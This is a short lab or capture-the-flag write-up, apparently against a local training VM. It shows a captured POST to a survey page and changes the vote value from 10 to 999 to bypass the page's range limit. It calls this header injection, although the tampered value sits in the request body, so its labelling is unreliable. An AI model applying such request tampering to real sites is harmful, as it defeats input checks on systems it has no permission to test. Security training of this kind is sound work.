# HTTP Header Injection

Passing datas through header could be a serious breach as we can use a tool like BurpSuite to modify it.

The survey page allows us to vote for some users, icking a note between 1 and 10 in a list.
Let's check the request:
```shell
POST /?page=survey HTTP/1.1
Host: 192.168.56.102
Content-Length: 17
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.56.102
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en
Referer: http://192.168.56.102/?page=survey
Accept-Encoding: gzip, deflate, br
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; arp_scroll_position=0
Connection: close

sujet=2&valeur=10
```
We can see the value is sent to server in the header, so if the server doesn't check this value we can modifiy our header and send any value > 10, out of range of the initial list.
So we change _sujet=2&valeur=10_ to sujet=2&valeur=999
and send request.

## External Resources

https://blog.yeswehack.com/yeswerhackers/http-header-exploitation/